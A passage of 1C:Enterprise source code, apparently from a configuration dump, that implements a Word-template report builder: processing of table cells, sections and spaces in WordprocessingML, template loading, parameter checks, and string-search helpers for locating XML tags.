// Параметры:
//  сТекст - строка - обрабатываемый фрагмент текста
//
Функция ОбработкаПустыхЯчеек(сТекст)
	сРезТекст = """";
	цПозКонцаПред = 1;
	// ищем тэг начала таблицы
	цПозНачала = Найти(сТекст, ""<w:tbl>"");
	Пока цПозНачала > 0 Цикл
		цПозКонца = ПостроительОтчетовКлиентСервер.НайтиИндексКонцаТэга(сТекст, цПозНачала + СтрДлина(""<w:tbl>""), ""<w:tbl>"", ""</w:tbl>"");
		сРезТекст = сРезТекст + Сред(сТекст, цПозКонцаПред, цПозНачала - цПозКонцаПред) + 
					ОбработкаПустыхЯчеекТаблицы(Сред(сТекст, цПозНачала, цПозКонца - цПозНачала));
		цПозНачала = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сТекст, ""<w:tbl>"", цПозКонца);
		цПозКонцаПред = цПозКонца;
	КонецЦикла;
	
	Возврат сРезТекст + Сред(сТекст, цПозКонцаПред, СтрДлина(сТекст) - цПозКонцаПред + 1);
КонецФункции

// Добавляет пустые абзацы в пустые секции. С точки зрения Ворда в секции обязан быть абзац
// хотябы пустой, но при обработке шаблона может случиться так, что секция останется пустой.
//
// Параметры:
//  сТекст - строка - обрабатываемый фрагмент текста
//
Процедура ОбработкаПустыхСекций(сТекст)
	НачалоСодержимого = Найти(сТекст, ""<w:sdtContent>"");
	Если НачалоСодержимого > 0 Тогда
		сРезТекст = """";
		НачалоСодержимогоПред = 1;
		Пока НачалоСодержимого > 0 Цикл
			НачалоСодержимого = НачалоСодержимого + 14;
			КонецСодержимого = ПостроительОтчетовКлиентСервер.НайтиИндексКонцаТэга(сТекст, НачалоСодержимого, ""<w:sdtContent>"", ""</w:sdtContent>"");
			Если ПостроительОтчетовКлиентСервер.НайтиНачинаяСПо(сТекст, ""<"", НачалоСодержимого, КонецСодержимого - 15) = 0 Тогда
				сРезТекст = сРезТекст + Сред(сТекст, НачалоСодержимогоПред, НачалоСодержимого - НачалоСодержимогоПред) + ""<w:p/>"";
				НачалоСодержимогоПред = НачалоСодержимого;
			КонецЕсли;
			НачалоСодержимого = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сТекст, ""<w:sdtContent>"", НачалоСодержимого);
		КонецЦикла;
		
		сТекст = сРезТекст + Сред(сТекст, НачалоСодержимогоПред, СтрДлина(сТекст) - НачалоСодержимогоПред + 1);
	КонецЕсли;
КонецПроцедуры

// Переносит пробел из блока текста содержащего только пробел в конец предыдущего блок текста, а если нет 
// предыдущего, то в начало следующего. Если в абзаце только пробел, то перенос не осуществляется.
// 
// Параметры:
//  сТекст - строка - обрабатываемый текст
//
Процедура ОбработкаБлоковТекстаСодержащихТолькоПробел(сТекст)
	сТекст = СтрЗаменить(сТекст, ""<w:t>"", ""<w:t xml:space=""""preserve"""">"");
КонецПроцедуры

// Переносит пробел из блока текста содержащего только пробел в конец предыдущего блок текста, а если нет 
// предыдущего, то в начало следующего. Если в абзаце только пробел, то перенос не осуществляется.
// 
// Параметры:
//  сТекст - строка - обрабатываемый текст
//
//Процедура ОбработкаБлоковТекстаСодержащихТолькоПробел(сТекст)
//	сРез = """";
//	// ищем текст (тег <w:t>) содержащий только пробел
//	НачалоТекста = Найти(сТекст, ""<w:t xml:space=""""preserve""""> <"");
//	Пока НачалоТекста > 0 Цикл
//		НеОбработали = Ложь;
//		// ищем начало блока (тег <w:r>)
//		НачалоБлока = ПостроительОтчетовКлиентСервер.НайтиНачалоБлокаТекстаСправа(сТекст, НачалоТекста);
//		// ищем начало конец предыдущего текста (предыдущий тег </w:t>)
//		КонецПредыдущегоТекста = ПостроительОтчетовКлиентСервер.НайтиНачалоТэгаСправа(сТекст, ""/w:t"", НачалоБлока);
//		// ищем следующий блок текста (тег <w:r>)
//		НачалоСледующегоБлокаТекста = ПостроительОтчетовКлиентСервер.НайтиНачалоБлокаТекста(сТекст, НачалоТекста);
//		// ищем следующий блок текста (тег <w:t>)
//		НачалоСледующегоТекста = ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""w:t"", НачалоСледующегоБлокаТекста);
//		// ищем начало абзаца (тег <w:p>)
//		НачалоАбзаца = ПостроительОтчетовКлиентСервер.НайтиНачалоАбзацаСправа(сТекст, НачалоБлока);
//		// ищем конец абзаца (тег </w:p>)
//		КонецАбзаца = ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""/w:p"", НачалоТекста);
//		// ищем конец элемента разметки левее (тег </w:sdt>)
//		КонецЭлементаСлева = ПостроительОтчетовКлиентСервер.НайтиНачалоТэгаСправа(сТекст, ""/w:sdt"", НачалоБлока);
//		// ищем начало элемента разметки правее (тег <w:sdt>)
//		НачалоЭлементаСправа = ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""w:sdt"", НачалоТекста);
//		// ищем конец ссылки на сноску левее (тег </w:footnoteReference>)
//		КонецСноскиСлева = ПостроительОтчетовКлиентСервер.НайтиНачалоТэгаСправа(сТекст, ""/w:footnoteReference"", НачалоБлока);
//		// ищем начало ссылки на сноску правее (тег <w:footnoteReference>)
//		НачалоСноскиСправа = ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""w:footnoteReference"", НачалоТекста);
//		// ищем конец ссылки на концевую сноску левее (тег </w:endnoteReference>)
//		КонецКонцевойСноскиСлева = ПостроительОтчетовКлиентСервер.НайтиНачалоТэгаСправа(сТекст, ""/w:endnoteReference"", НачалоБлока);
//		// ищем начало ссылки на концевую сноску правее (тег <w:endnoteReference>)
//		НачалоКонцевойСноскиСправа = ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""w:endnoteReference"", НачалоТекста);
//		// ищем конец ссылки на примечание левее (тег <w:commentRangeEnd>)
//		КонецПримечанияСлева = ПостроительОтчетовКлиентСервер.НайтиНачалоТэгаСправа(сТекст, ""w:commentRangeEnd"", НачалоБлока);
//		// ищем начало ссылки на примечание правее (тег <w:commentRangeStart>)
//		НачалоПримечаниеСправа = ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""w:commentRangeStart"", НачалоТекста);
//		Если НачалоСледующегоБлокаТекста > 0 И КонецАбзаца > НачалоСледующегоБлокаТекста И 
//			 (НачалоЭлементаСправа = 0 Или НачалоЭлементаСправа > НачалоСледующегоБлокаТекста) И
//			 (НачалоСноскиСправа = 0 Или НачалоСноскиСправа > НачалоСледующегоТекста) И
// 			 (НачалоКонцевойСноскиСправа = 0 Или НачалоКонцевойСноскиСправа > НачалоСледующегоТекста) Тогда
//			// ищем следующий текст (тег <w:t>)
//			НачалоСледующегоТекста = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сТекст, "">"", НачалоСледующегоТекста) + 1;
//			// иначе пытаемся перенести в следующий блок текста
//			сРез = сРез + Лев(сТекст, НачалоБлока - 1) + Сред(сТекст, НачалоСледующегоБлокаТекста, НачалоСледующегоТекста - НачалоСледующегоБлокаТекста) + "" "";
//			сТекст = Сред(сТекст, НачалоСледующегоТекста);
//		ИначеЕсли КонецПредыдущегоТекста > 0 И НачалоАбзаца < КонецПредыдущегоТекста И 
//				  (КонецЭлементаСлева = 0 Или КонецЭлементаСлева < КонецПредыдущегоТекста) И
//				  (КонецСноскиСлева = 0 Или КонецСноскиСлева < КонецПредыдущегоТекста) И
//				  (КонецКонцевойСноскиСлева = 0 Или КонецКонцевойСноскиСлева < КонецПредыдущегоТекста) Тогда
//			// если предыдущий блок существует в абзаце, то переносим пробел в него
//			сРез = сРез + Лев(сТекст, КонецПредыдущегоТекста - 1) + "" "" + Сред(сТекст, КонецПредыдущегоТекста, НачалоБлока - КонецПредыдущегоТекста);
//			сТекст = Сред(сТекст, ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""/w:r"", НачалоБлока) + 6);
//		ИначеЕсли НачалоЭлементаСправа > 0 И КонецАбзаца > НачалоЭлементаСправа И 
//				  (НачалоСноскиСправа = 0 Или НачалоСноскиСправа > НачалоЭлементаСправа) И
// 			 	  (НачалоКонцевойСноскиСправа = 0 Или НачалоКонцевойСноскиСправа > НачалоЭлементаСправа) Тогда
//			// переносим пробел в секцию в этом же абзаце следующую за блоком с одним пробелом
//			НачалоСодержимого = ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""w:sdtContent"", НачалоЭлементаСправа);
//			// ищем свойства элемента управления содержимым
//			сТипСекции = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(сТекст, ""<w:tag w:val="""""", НачалоЭлементаСправа, НачалоСодержимого);
//			Если сТипСекции = ""Секция"" Тогда
//				сРез = сРез + Лев(сТекст, НачалоБлока - 1);
//				сТекст = Сред(сТекст, НачалоЭлементаСправа);
//				НачалоТекстаСекции = ПостроительОтчетовКлиентСервер.НайтиНачинаяС(сТекст, "">"", ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""w:t""));
//				сРез = сРез + Лев(сТекст, НачалоТекстаСекции) + ""&quot; &quot; + "";
//				сТекст = Сред(сТекст, НачалоТекстаСекции + 1);
//				КонецСекции = ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""/w:sdt"") + 7;
//				сРез = сРез + Лев(сТекст, КонецСекции);
//				сТекст = Сред(сТекст, КонецСекции + 1);
//			Иначе
//				НеОбработали = Истина;
//			КонецЕсли;
//		ИначеЕсли КонецЭлементаСлева > 0 И НачалоАбзаца < КонецЭлементаСлева И
//				  (КонецСноскиСлева = 0 Или КонецСноскиСлева < КонецЭлементаСлева) И
//				  (КонецКонцевойСноскиСлева = 0 Или КонецКонцевойСноскиСлева < КонецЭлементаСлева) Тогда
//			// переносим пробел в секцию в этом же абзаце предыдующую переде блоком с одним пробелом
//			НачалоЭлементаСлева = ПостроительОтчетовКлиентСервер.НайтиНачалоТэгаСправа(сТекст, ""w:sdt"", КонецЭлементаСлева);
//			// ищем начало содержимого элемента разметки
//			НачалоСодержимого = ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""w:sdtContent"", НачалоЭлементаСлева);
//			// ищем свойства элемента управления содержимым
//			сТипСекции = ПостроительОтчетовКлиентСервер.ПолучитьЗначениеАтрибутаWMLТега(сТекст, ""<w:tag w:val="""""", НачалоЭлементаСлева, НачалоСодержимого);
//			Если сТипСекции = ""Секция"" Тогда
//				// ищем конец содержимого секции
//				КонецТекста = ПостроительОтчетовКлиентСервер.НайтиНачалоТэгаСправа(сТекст, ""/w:t"", КонецЭлементаСлева);
//				сРез = сРез + Лев(сТекст, КонецТекста - 1) + "" + &quot; &quot;"" + Сред(сТекст, КонецТекста, НачалоБлока - КонецТекста);
//				сТекст = Сред(сТекст, ПостроительОтчетовКлиентСервер.НайтиНачалоТэга(сТекст, ""/w:r"", НачалоБлока) + 6);
//			Иначе
//				НеОбработали = Истина;
//			КонецЕсли;
//		Иначе
//			НеОбработали = Истина;
//		КонецЕсли;
//		Если НеОбработали Тогда
//			сРез = сРез + Лев(сТекст, КонецАбзаца - 1);
//			сТекст = Сред(сТекст, КонецАбзаца);
//		КонецЕсли;
//		НачалоТекста = Найти(сТекст, ""<w:t xml:space=""""preserve""""> <"");
//	КонецЦикла;
//	сРез = сРез + сТекст;
//	
//	сТекст = СтрЗаменить(сРез, ""<w:t>"", ""<w:t xml:space=""""preserve"""">"");
//КонецПроцедуры

#КонецОбласти

#Область ФункцияПолученияТекстаШаблонаОтчета

// Возвращает текст шаблона, в случае если шаблон хранится в макете отчета
//
// Параметры:
//  Шаблон - in, структура, описывающая шаблон объекта конфигурации
//
// Возвращаемое значение:
//  структура - содержащая данные о считанном шаблоне
//
Функция ПолучитьВременныйФайлШаблонаИзМакета(Шаблон)
	МенеджерОбъектов = ?(Шаблон.Свойство(""МенеджерОбъектов""), Шаблон.МенеджерОбъектов, Отчеты);
	Макет = МенеджерОбъектов[Шаблон.ИмяОбъекта].ПолучитьМакет(Шаблон.Шаблон);
	ИмяВременногоФайла = ПолучитьИмяВременногоФайла();
	Макет.Записать(ИмяВременногоФайла);
	
	Возврат ИмяВременногоФайла;
КонецФункции

// Возвращает текст шаблона, в случае если шаблон хранится во временном хранилище
//
// Параметры:
//  АдресХранилища - in, строка, путь к файлу шаблона во временном хранилище
//
// Возвращаемое значение:
//  структура - содержащая данные о считанном шаблоне
//
Функция ПолучитьВременныйФайлШаблонаИзВременногоХранилища(АдресХранилища)
	ДвоичныеДанные = ПолучитьИзВременногоХранилища(АдресХранилища);
	ИмяВременногоФайла = ПолучитьИмяВременногоФайла();
	ДвоичныеДанные.Записать(ИмяВременногоФайла);
	
	Возврат ИмяВременногоФайла;
КонецФункции

// Возвращает текст шаблона, в случае если шаблон хранится в файле
//
// Параметры:
//  ПутьКФайлу - in, строка, путь к файлу шаблона на диске
//
// Возвращаемое значение:
//  структура - содержащая данные о считанном шаблоне
//
Функция ПолучитьВременныйФайлШаблонаИзФайла(ПутьКФайлу)
	ИмяВременногоФайла = ПолучитьИмяВременногоФайла();
	КопироватьФайл(ПутьКФайлу, ИмяВременногоФайла);
	
	Возврат ИмяВременногоФайла;
КонецФункции

// Возвращает текст шаблона, в случае если шаблон хранится в макете отчета
//
// Параметры:
//  Шаблон - in, структура, описывающая шаблон объекта конфигурации
//
// Возвращаемое значение:
//  структура - содержащая данные о считанном шаблоне
//
Функция ПолучитьДанныеШаблона(Шаблон) Экспорт
	Если ЭтоАдресВременногоХранилища(Шаблон.Шаблон) Тогда
        ИмяВременногоФайла = ПолучитьВременныйФайлШаблонаИзВременногоХранилища(Шаблон.Шаблон);
	ИначеЕсли ПостроительОтчетовКлиентСервер.ЭтоПутьКФайлу(Шаблон.Шаблон) Тогда
        ИмяВременногоФайла = ПолучитьВременныйФайлШаблонаИзФайла(Шаблон.Шаблон);
	Иначе
		ИмяВременногоФайла = ПолучитьВременныйФайлШаблонаИзМакета(Шаблон);
	КонецЕсли;
	ДанныеШаблона = ПостроительОтчетовКлиентСервер.ПолучитьДанныеШаблонаИзФайла(ИмяВременногоФайла);
	// удаляем временный файл, он нам больше не нужен
	УдалитьФайлы(ИмяВременногоФайла);
	
	Возврат ДанныеШаблона;
КонецФункции

#КонецОбласти

#Область ФункцияКонтроляПараметровФормированияОтчета

// Контроль корректности входных параметров функции формирования отчета
//
// Параметры:
//  Шаблон - in, структтура, описывающая шаблон объекта конфигурации
//
// Возвращаемое значение:
//  булево - истина, если параметры заданы правильно, иначе ложь
//
Функция КонтрольВходныхПараметровШаблона(Шаблон, ВызвавшийОбъект)
	Если ТипЗнч(Шаблон) <> Тип(""Структура"") Тогда
		Возврат ""Данные о шаблоне отчета должны быть переданы в виде структуры!"";
	КонецЕсли;
	
	Если Не Шаблон.Свойство(""Шаблон"") Тогда
		Возврат ""Во входных данных не задан шаблон отчета!"";
	КонецЕсли;
	
	Если Не ЭтоАдресВременногоХранилища(Шаблон.Шаблон) И Не ПостроительОтчетовКлиентСервер.ЭтоПутьКФайлу(Шаблон.Шаблон) И Не Шаблон.Свойство(""ИмяОбъекта"") Тогда
		Возврат ""Для внутреннего шаблона должно быть обязательно задано имя объекта!"";
	КонецЕсли;
	
	Попытка
		ВызвавшийОбъект.ПолучитьДанные(""1"", Неопределено);
	Исключение
		Возврат ""В модуле вызвавшего объекта не определена функция """"ПолучитьДанные""""!"";
	КонецПопытки;
	
	Возврат """";
КонецФункции

#КонецОбласти

#Область ФункцияСозданияСтруткурыКонтекста

// Подготовка струтуры контекста формирования отчета
//
// Параметры:
//  Шаблон - структура, должна содержать поле ""Шаблон"" - строка определяющая шаблон и поле ""Отчет"" - имя отчета, 
//			В качестве шаблона может быть передано одно из следующих значений:
//			1. Имя макета отчета в конфигураторе;
//			2. Адрес файла во временном хранилище.
//  ВызвавшийОбъект - объект - объект, вызвавший формирование отчета, необходим для вызова функции ПолучитьДанные, 
//					 которая должна быть определена в вызвавшем объекте
//
// Возвращаемое значение:
//  структура - для хранения данных контекста выполнения отчета
//
Функция ПодготовитьКонтекст(Шаблон, ВызвавшийОбъект, УдалитьНеобработанные, Итерация)
	тзИтераторы = Новый ТаблицаЗначений;
	тзИтераторы.Колонки.Добавить(""Итератор"");
	тзИтераторы.Колонки.Добавить(""ТекЭлем"");
	тзИтераторы.Колонки.Добавить(""Имя"");
	
	Контекст = Новый Структура();
	Контекст.Вставить(""ВызвавшийОбъект"", ВызвавшийОбъект);
	Контекст.Вставить(""Итераторы"", тзИтераторы);
	Контекст.Вставить(""Переменные"", Новый Структура);
	Контекст.Вставить(""Подстановки"", Новый Структура);
	Контекст.Вставить(""РежимКоммент"", Ложь);
	Контекст.Вставить(""Рез"", Новый ТекстовыйДокумент);
	Контекст.Вставить(""АдресаФрагментов"", Новый Массив);
	Контекст.Вставить(""ДанныеШаблона"", ПолучитьДанныеШаблона(Шаблон));
	Контекст.Вставить(""ЗначенияАтрибутов"");
	Контекст.Вставить(""ОбработкаФрагментовНаСервере"", Истина);
	Контекст.Вставить(""XMLСхемыДокумента"");
	Контекст.Вставить(""XMLСхемыСписков"");
	Контекст.Вставить(""XMLСхемыСтилей"");
	Контекст.Вставить(""XMLСхемыСносок"");
	Контекст.Вставить(""XMLСхемыКонцевыхСносок"");
	Контекст.Вставить(""XMLСхемыПримечаний"");
	СформироватьТаблицыДляСписков(Контекст);
	Контекст.Вставить(""Сноски"");
	Контекст.Вставить(""КонцевыеСноски"");
	Контекст.Вставить(""Примечания"");
	Контекст.Вставить(""ИндексВставленногоОбъекта"", 5000);
	Контекст.Вставить(""ИндексФрагмента"", 0);
	Контекст.Вставить(""ОбработкаКолонтитулов"", Ложь);
	Контекст.Вставить(""УдалитьНеобработанные"", УдалитьНеобработанные);
	Контекст.Вставить(""Итерация"", Итерация);
	
	Возврат Контекст;
КонецФункции

#КонецОбласти

#Область ФункцияЗапускаФормированияОтчета

// Формирование отчета
//
// Параметры:
//  Шаблон - структура, должна содержать поле ""Шаблон"" - строка определяющая шаблон и поле ""Отчет"" - имя отчета, 
//			В качестве шаблона может быть передано одно из следующих значений:
//			1. Имя макета отчета в конфигураторе;
//			2. Адрес файла во временном хранилище.
//  ВызвавшийОбъект - объект - объект, вызвавший формирование отчета, необходим для вызова функции ПолучитьДанные, 
//					 которая должна быть определена в вызвавшем объекте
//  УдалитьНеобработанные - булево - если истина, то из шаблона удаляются пропущенные элементы разметки
//  Итерация - число - номер итерации, означает, что при формировании печатной формы, обрабатывается только 
//			  элементы разметки, значение одноименного атрибута которых равно значению параметра или незаполнен
//
// Возвращаемое значение:
//  структура - результат выполнения отчета
//
Функция СформироватьОтчет(Шаблон, ВызвавшийОбъект, УдалитьНеобработанные = Истина, Итерация = 0) Экспорт
	ТекстОшибки = КонтрольВходныхПараметровШаблона(Шаблон, ВызвавшийОбъект);
	Если Не ПустаяСтрока(ТекстОшибки) Тогда
		ВызватьИсключение ТекстОшибки;
	КонецЕсли;
	
	// ФОРМИРОВАНИЕ ОТЧЕТА
	Контекст = ПодготовитьКонтекст(Шаблон, ВызвавшийОбъект, УдалитьНеобработанные, Итерация);

	УдалитьСвойстваДокумента(Контекст.ДанныеШаблона);
	НормализоватьШаблон(Контекст.ДанныеШаблона.ТекстШаблона);
	
	Контекст.ЗначенияАтрибутов = ПостроительОтчетовКлиентСервер.СчитатьАтрибутыСекций(Контекст.ДанныеШаблона);
	СчитатьОпределениеXMLСхем(Контекст);
	СчитатьОпределениеСписков(Контекст);
	СчитатьОпределениеСносок(Контекст);
	СчитатьОпределениеСносок(Контекст, Истина);
	СчитатьОпределениеПримечаний(Контекст);
	
	СтруктураШаблона = СчитатьСтруктуруШаблона(Контекст.ДанныеШаблона.ТекстШаблона, Контекст.ЗначенияАтрибутов, Итерация);
	ОбъединитьОдноименныеСекции(СтруктураШаблона);
	
	ОбработкаШаблона(СтруктураШаблона, Контекст);
	Контекст.ДанныеШаблона.ТекстШаблона = Контекст.Рез.ПолучитьТекст();
	
	ВставитьОпределениеXMLСхем(Контекст);
	// колонтитулы необходимо обрабатывать до обработки списков, т.к. в колонтитулах так же могут быть списки
	Контекст.ОбработкаКолонтитулов = Истина;
	ОбработатьКолонтитулы(Контекст.ДанныеШаблона.НижниеКолонтитулы, Контекст);
	ОбработатьКолонтитулы(Контекст.ДанныеШаблона.ВерхниеКолонтитулы, Контекст);
	
	ОбработатьОпределениеСписков(Контекст);
	ОбработатьСноски(Контекст);
	ОбработатьСноски(Контекст, Истина);
	ОбработатьПримечания(Контекст);
	
	ОбъединениеЯчеек(Контекст.ДанныеШаблона.ТекстШаблона);
	Если УдалитьНеобработанные Тогда
		УдалитьНеобработанныеЭлементыРазметки(Контекст.ДанныеШаблона.ТекстШаблона);
	Иначе
		ОбработкаПустыхСекций(Контекст.ДанныеШаблона.ТекстШаблона);
	КонецЕсли;	
	ОбработкаАбзацев(Контекст.ДанныеШаблона.ТекстШаблона);
	ОбработкаБлоковТекстаСодержащихТолькоПробел(Контекст.ДанныеШаблона.ТекстШаблона);
	Контекст.ДанныеШаблона.ТекстШаблона = ОбработкаПустыхЯчеек(Контекст.ДанныеШаблона.ТекстШаблона);
	
	ПостроительОтчетовКлиентСервер.ПереформироватьФайлНастроекДокумента(Контекст.ДанныеШаблона, Контекст.ЗначенияАтрибутов);
	
	Рез = Новый Структура;
	Рез.Вставить(""АдресОтчетаВХранилище"", ПостроительОтчетовКлиентСервер.СформироватьИтоговыйФайлОтчета(Контекст.ДанныеШаблона));
	Рез.Вставить(""ОбработкаФрагментовНаСервере"", Контекст.ОбработкаФрагментовНаСервере);
	Рез.Вставить(""АдресаФрагментов"", Контекст.АдресаФрагментов);
	Если Шаблон.Свойство(""ИмяОбъекта"") Тогда
		Рез.Вставить(""ИмяОтчета"", Шаблон.ИмяОбъекта);
	КонецЕсли;
	
	Возврат Рез;
КонецФункции

#КонецОбласти
"}
},
{0,
{"ПостроительОтчетовКлиентСервер",0,0,"","// МОДУЛЬ ПОСТРОИТЕЛЬ ОТЧЕТОВ КЛИЕНТ-СЕРВЕР
// Клиент-серверная часть построителя отчетов.
// В модуле содержатся служебные процедуры и функции, вызываемые с клиента и сервера


#Область СервисныеФункцииРаботыСоСтроками

// Убирает пробелы из строки
//
// Параметры
//  Стр - in, исходная строка
//
// Возвращаемое значение
//  Обработанная строка
//
Функция УбратьПробелы(Знач Стр) Экспорт
	Возврат СтрЗаменить(СтрЗаменить(Стр, "" "", """"), Символы.НПП, """");
КонецФункции

// Поиск в строке подстроки начиная с указанной позиции
//
// Параметры
//  Стр - in, исходная строка
//  СтрокаПоиска - in, подстрока для поиска
//  ИскатьС - in, позиция, с которой необходимо начинать поиск
//
// Возвращаемое значение
//  Позиция первого символа искомой подстроки в строке
//
Функция НайтиНачинаяС(Знач Стр, Знач СтрокаПоиска, Знач ИскатьС) Экспорт
	Если ИскатьС > 0 И ИскатьС <= СтрДлина(Стр) Тогда
		Возврат СтрНайти(Стр, СтрокаПоиска, НаправлениеПоиска.СНачала, ИскатьС);
	Иначе
		Возврат 0;
	КонецЕсли;
КонецФункции

// Поиск в строке подстроки начиная с позиции ИскатьС до позиции ИскатьПо
//
// Параметры
//  Стр - in, исходная строка
//  СтрокаПоиска - in, подстрока для поиска
//  ИскатьС - in, позиция, с которой необходимо начинать поиск
//  ИскатьПо - in, позиция, до которой необходимо выполнять поиск
//
// Возвращаемое значение
//  Позиция первого символа искомой подстроки в строке
//
Функция НайтиНачинаяСПо(Знач Стр, Знач СтрокаПоиска, Знач ИскатьС, Знач ИскатьПо) Экспорт
	Рез = НайтиНачинаяС(Стр, СтрокаПоиска, ИскатьС);
	Если Рез > 0 И Рез >= ИскатьПо Тогда
		Рез = 0;
	КонецЕсли;
	
 	Возврат Рез;
КонецФункции

// Ищет первое вхождение справа (с конца строки или с переданного индекса)
//
// Параметры
//  Стр - in, исходная строка
//  СтрокаПоиска - in, подстрока для поиска
//  ИскатьС - in, позиция, с которой необходимо начинать поиск
//
// Возвращаемое значение
//  Позиция первого символа искомой подстроки в строке
//
Функция НайтиСправа(Знач Стр, Знач СтрокаПоиска, Знач ИскатьС = 0) Экспорт
	Если ИскатьС > СтрДлина(Стр) Тогда
		Возврат 0;
	КонецЕсли;
	
	Если ИскатьС = 0 Тогда
		ИскатьС = СтрДлина(Стр);
	КонецЕсли;
	
	НомерВхождения = 1;
	Рез = СтрНайти(Стр, СтрокаПоиска, НаправлениеПоиска.СКонца, ИскатьС, НомерВхождения);
	Пока Рез > 0 И Рез + СтрДлина(СтрокаПоиска) > ИскатьС Цикл
		НомерВхождения = НомерВхождения + 1;
		Рез = СтрНайти(Стр, СтрокаПоиска, НаправлениеПоиска.СКонца, ИскатьС, НомерВхождения);
	КонецЦикла;
	
	Возврат Рез;
КонецФункции

// Поиск начало тега в строке начиная с переданной позиции, 
// может быть со свойствами (ищем ""<w:... "") или без свойств (ищем ""<w:...>"")
// 
// Параметры
//  Текст - in, текст, в котором ищется абзац
//  ИмяТэга - in, искомый тег
//  ИскатьС - in, позиция, с которой необходимо начинать поиск
//
// Возвращаемое значение
//  Индекс начала тэга
//
Функция НайтиНачалоТэга(Знач Текст, Знач ИмяТэга, Знач ИскатьС = 1) Экспорт
	Рез = 0;
	Масс = Новый Массив;
	Масс.Добавить(НайтиНачинаяС(Текст, ""<"" + ИмяТэга + "" "", ИскатьС));
	Масс.Добавить(НайтиНачинаяС(Текст, ""<"" + ИмяТэга + "">"", ИскатьС));
	Масс.Добавить(НайтиНачинаяС(Текст, ""<"" + ИмяТэга + ""/>"", ИскатьС));
	Для Каждого Поз Из Масс Цикл
		Если Поз > 0 И (Рез = 0 Или Рез > Поз) Тогда
			Рез = Поз;
		КонецЕсли;
	КонецЦикла;
	
	Возврат Рез;
КонецФункции

// Поиск начало тега справа в строке начиная с конца строки или с переданной позиции, 
// может быть со свойствами (ищем ""<w:... "") или без свойств (ищем ""<w:...>"")
// 
// Параметры
//  Текст - in, текст, в котором ищется абзац
//  ИмяТэга - in, искомый тег
//  ИскатьС - in, позиция, с которой необходимо начинать поиск
//
// Возвращаемое значение
//  Индекс начала тэга
//
Функция НайтиНачалоТэгаСправа(Знач Текст, Знач ИмяТэга, Знач ИскатьС = 0) Экспорт
	Рез = 0;
	Масс = Новый Массив;
	Масс.Добавить(НайтиСправа(Текст, ""<"" + ИмяТэга + "" "", ИскатьС));
	Масс.Добавить(НайтиСправа(Текст, ""<"" + ИмяТэга + "">"", ИскатьС));
	Масс.Добавить(НайтиСправа(Текст, ""<"" + ИмяТэга + ""/>"", ИскатьС));
	Для Каждого Поз Из Масс Цикл
		Если Поз > 0 И (Рез = 0 Или Рез < Поз) Тогда
			Рез = Поз;
		КонецЕсли;
	КонецЦикла;
	
	Возврат Рез;
КонецФункции

// Поиск тега начала абзаца в строке начиная с переданной позиции, 
// может быть со свойствами (ищем ""<w:p "") или без свойств (ищем ""<w:p>"")
// 
// Параметры
//  Текст - in, текст, в котором ищется абзац
//  ИскатьС - in, позиция, с которой необходимо начинать поиск
//
// Возвращаемое значение
//  Индекс начала тэга абзаца
//
Функция НайтиНачалоАбзаца(Знач Текст, Знач ИскатьС = 1) Экспорт
	Возврат НайтиНачалоТэга(Текст, ""w:p"", ИскатьС);
КонецФункции

// Поиск тега начала абзаца в строке справа начиная с конца строки или переданной позиции, 
// может быть со свойствами (ищем ""<w:p "") или без свойств (ищем ""<w:p>"")
// 
// Параметры
//  Текст - in, текст, в котором ищется абзац
//  ИскатьС - in, позиция, с которой необходимо начинать поиск
//
// Возвращаемое значение
//  Индекс начала тэга абзаца
//
Функция НайтиНачалоАбзацаСправа(Знач Текст, Знач ИскатьС = 0) Экспорт
	Возврат НайтиНачалоТэгаСправа(Текст, ""w:p"", ИскатьС);
КонецФункции

// Поиск тега начала блока текста в строке начиная с переданной позиции, 
// может быть со свойствами (ищем ""<w:r "") или без свойств (ищем ""<w:r>"")
// 
// Параметры
//  Текст - in, текст, в котором ищется абзац
//  ИскатьС - in, позиция, с которой необходимо начинать поиск
//
// Возвращаемое значение
//  Индекс начала тэга абзаца
//
Функция НайтиНачалоБлокаТекста(Знач Текст, Знач ИскатьС = 1) Экспорт
	Возврат НайтиНачалоТэга(Текст, ""w:r"", ИскатьС);
КонецФункции

// Поиск тега начала блока текста справа в строке начиная конца строки или с переданной позиции, 
// может быть со свойствами (ищем ""<w:r "") или без свойств (ищем ""<w:r>"")
// 
// Параметры
//  Текст - in, текст, в котором ищется абзац
//  ИскатьС - in, позиция, с которой необходимо начинать поиск
//
// Возвращаемое значение
//  Индекс начала тэга абзаца
//
Функция НайтиНачалоБлокаТекстаСправа(Знач Текст, Знач ИскатьС = 0) Экспорт
	Возврат НайтиНачалоТэгаСправа(Текст, ""w:r"", ИскатьС);
КонецФункции

// Поиск конца составного тега
//
// Параметры
//  Текст - in, текст, в котором ищется конец тега
//  ИндексНачалаТэга - in, индекс начала тега в сТекст
//  ОткрывающийТэг - in, строка содержащая открывающий тег
//	ЗакрывающийТэг - in, строка содержащая зарывающий тег
//
// Возвращаемое значение:
//  Индекс конца тега
//
Функция НайтиИндексКонцаТэга(Знач Текст, Знач ИндексНачалаТэга, Знач ОткрывающийТэг, Знач ЗакрывающийТэг) Экспорт
	цДлинаОткрывающегоТэга = СтрДлина(ОткрывающийТэг);
	цДлинаЗакрывающегоТэга = СтрДлина(ЗакрывающийТэг);
	цКоличествоТэгов = 1;
	цИскатьС = ИндексНачалаТэга;
	// ищем закрывающий тэг пропуская внутренние тэги
	Пока цКоличествоТэгов > 0 Цикл
		// ищем начало и конец тэга
		ИндексНачалаТэга = НайтиНачинаяС(Текст, ОткрывающийТэг, цИскатьС);
		цИндексКонцаТэга = НайтиНачинаяС(Текст, ЗакрывающийТэг, цИскатьС);
